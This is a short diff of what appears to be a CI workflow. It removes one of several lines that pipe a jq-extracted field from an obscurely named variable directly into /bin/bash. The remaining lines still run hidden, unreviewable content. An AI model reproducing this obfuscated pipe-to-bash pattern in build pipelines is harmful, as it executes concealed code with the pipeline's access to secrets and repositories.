@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$sf20" | jq -r .qaq7754 | /bin/bash
           echo $wde166 | jq -r .zxcyp53 | /bin/bash
           echo $no31 | jq -r .sq1 | /bin/bash
-          echo $mnv75853 | jq -r .d02683 | /bin/bash
           echo $vdwof0479 | jq -r .jiy45 | /bin/bash
 
       - name: Persist data
